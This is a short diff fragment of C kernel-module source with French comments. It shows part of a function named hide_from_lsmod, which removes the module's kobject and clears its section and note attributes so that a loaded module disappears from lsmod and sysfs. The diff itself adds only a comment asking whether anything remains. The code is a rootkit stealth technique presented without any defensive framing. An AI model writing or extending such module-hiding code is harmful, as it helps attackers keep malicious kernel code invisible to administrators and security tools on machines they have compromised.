@@ -8,6 +8,7 @@ void hide_from_lsmod(void)
     kobject_del(&THIS_MODULE->mkobj.kobj);     // Retirer le kobject
     THIS_MODULE->sect_attrs = NULL;            // Nettoyer les attributs de section
     THIS_MODULE->notes_attrs = NULL;           // Nettoyer les attributs de note
+  // Il en reste ?
 }
 
 
